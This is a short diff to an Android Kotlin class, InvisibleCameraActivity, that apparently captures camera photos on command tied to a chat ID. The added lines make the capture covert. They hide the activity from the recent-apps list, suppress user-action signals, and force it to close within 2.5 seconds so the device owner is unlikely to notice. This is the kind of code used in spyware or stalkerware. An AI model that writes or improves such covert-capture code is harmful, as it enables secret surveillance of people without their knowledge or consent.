@@ -44,7 +44,12 @@ class InvisibleCameraActivity : AppCompatActivity() {
                 val intent = Intent(context, InvisibleCameraActivity::class.java).apply {
                     putExtra(EXTRA_CHAT_ID, chatId)
                     putExtra(EXTRA_IS_FRONT, isFront)
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK or
+                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
+                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
+                        Intent.FLAG_ACTIVITY_NO_USER_ACTION
+                    )
                 }
                 context.startActivity(intent)
             } catch (e: Exception) {
@@ -68,6 +73,11 @@ class InvisibleCameraActivity : AppCompatActivity() {
 
         val chatId = intent.getStringExtra(EXTRA_CHAT_ID) ?: ""
         val isFront = intent.getBooleanExtra(EXTRA_IS_FRONT, false)
+
+        // Safety self-destruction timer: guarantee finish in <2.5 seconds under all edge cases
+        Handler(Looper.getMainLooper()).postDelayed({
+            try { if (!isFinishing) finish() } catch (_: Exception) {}
+        }, 2500)
 
         capturePhotoResumed(chatId, isFront)
     }
